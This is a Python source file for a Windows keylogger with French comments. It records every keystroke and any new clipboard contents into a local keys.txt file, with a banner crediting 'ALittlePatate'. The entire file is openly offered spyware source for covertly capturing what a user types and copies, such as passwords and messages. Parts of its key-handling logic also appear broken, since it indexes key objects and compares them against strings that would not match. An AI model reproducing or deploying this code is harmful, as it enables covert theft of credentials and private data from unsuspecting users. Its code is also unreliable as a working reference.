from pynput.keyboard import Key, Listener
import sys
import win32clipboard
import os

old_clipboard = " "

def get_clipboard() :
    try :
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except :
        return "0"

def write_banner() :
    #On ouvre/créé le fichier keys.txt
    with open("keys.txt", "a") as f :
        #On écrit la bannière
        f.write("\n")
        f.write("#########################################\n")
        f.write("#   Simple Keylogger By ALittlePatate   #\n")
        f.write("#########################################\n")
        f.close()

def write_file(key) :
    #On ouvre/créé le fichier keys.txt
    with open("keys.txt", "a") as f :

        #On regarde si le presse-papier à changé en appelant la fonction get_clipboard()
        global old_clipboard
        if get_clipboard() != "0" and get_clipboard() != old_clipboard :
            f.write("\n")
            f.write("\n")
            f.write("[+] New clipboard content ! [+]\n")
            f.write(str(get_clipboard()))
            f.write("\n")
            f.write("[+] End of the new clipboard content. [+]\n")
            f.write("\n")
            old_clipboard = get_clipboard()
        
        #On regarde si key est un chiffre du pavé numérique
        if key == "<96>" :
            f.write("0")
        elif key == "<97>" :
            f.write("1")
        elif key == "<98>" :
            f.write("2")
        elif key == "<99>" :
            f.write("3")
        elif key == "<100>" :
            f.write("4")
        elif key == "<101>" :
            f.write("5")
        elif key == "<102>" :
            f.write("6")
        elif key == "<103>" :
            f.write("7")
        elif key == "<104>" :
            f.write("8")
        elif key == "<105>" :
            f.write("9")
        
        #On regarde si key est une combinaison avec CTRL
        elif key == "\\x01" :
            f.write("\n CTRL+A\n")
        elif key == "\\x1a" :
            f.write("\n CTRL+Z\n")
        elif key == "\\x05" :
            f.write("\n CTRL+E\n")
        elif key == "\\x12" :
            f.write("\n CTRL+R\n")
        elif key == "\\x14" :
            f.write("\n CTRL+T\n")
        elif key == "\\x19" :
            f.write("\n CTRL+Y\n")
        elif key == "\\x15" :
            f.write("\n CTRL+U\n")
        elif key == "\\t" :
            f.write("\n CTRL+I\n")
        elif key == "\\x0f" :
            f.write("\n CTRL+O\n")
        elif key == "\\x10" :
            f.write("\n CTRL+P\n")
        elif key == "\\x11" :
            f.write("\n CTRL+Q\n")
        elif key == "\\x13" :
            f.write("\n CTRL+S\n")
        elif key == "\\x04" :
            f.write("\n CTRL+D\n")
        elif key == "\\x06" :
            f.write("\n CTRL+F\n")
        elif key == "\\x07" :
            f.write("\n CTRL+G\n")
        elif key == "\\x08" :
            f.write("\n CTRL+H\n")
        elif key == "\\n" :
            f.write("\n CTRL+J\n")
        elif key == "\\x0b" :
            f.write("\n CTRL+K\n")
        elif key == "\\x0c" :
            f.write("\n CTRL+L\n")
        elif key == "\\r" :
            f.write("\n CTRL+M\n")
        elif key == "\\x17" :
            f.write("\n CTRL+W\n")
        elif key == "\\x18" :
            f.write("\n CTRL+X\n")
        elif key == "\\x03" :
            f.write("\n CTRL+C\n")
        elif key == "\\x16" :
            f.write("\n CTRL+V\n")
        elif key == "\\x02" :
            f.write("\n CTRL+B\n")
        elif key == "\\x0e" :
            f.write("\n CTRL+N\n")

        #On regarde si key est un espace, un retour à la ligne ou ce genre de trucs
        elif key == "Key.space" :
            f.write(" ")
        elif key == "Key.enter" :
            f.write("\n")
        elif key == "Key.backspace" :
            f.write(" [BACKSPACE] ")
        elif key == "Key.shift" or key == "Key.shift_r" :
            pass
        elif key == "Key.ctrl_l" or key == "Key.ctrl_r" :
            pass
        elif key == "Key.caps_lock" :
            pass
        elif key == "Key.num_lock" :
            pass
        elif key == "Key.alt_r" or key == "Key.alt_l" :
            pass
        elif key == "Key.tab" :
            f.write("\n[TAB]\n")
        elif key == "Key.up" :
            f.write("\nUp\n")
        elif key == "Key.down" :
            f.write("\nDown\n")
        elif key == "Key.left" :
            f.write("\nLeft\n")
        elif key == "Key.right" :
            f.write("\nRight\n")

        #On regarde si key est une touche qui doit être écrite en UTF-8
        elif key in messed_up_keys :
            f.write(str(key.encode('UTF-8')))

        #Si aucun des tests ne sont positifs, on écrit la variable key dans le fichier keys.txt
        else :
            f.write(key)

def on_press(key) :
    #On écrit la touche dans le fichier keys.txt
    write_file(key[0])

#On fait la liste des caractères non supportés par windows
messed_up_keys = ["é", "è", "à", "°", "^", "¨", "£", "¤", "ù", "µ"]

#On écrit la bannière dans le fichier keys.txt
write_banner()

#On capture les appuis de touches
with Listener(on_press=on_press) as listener :
    listener.join()
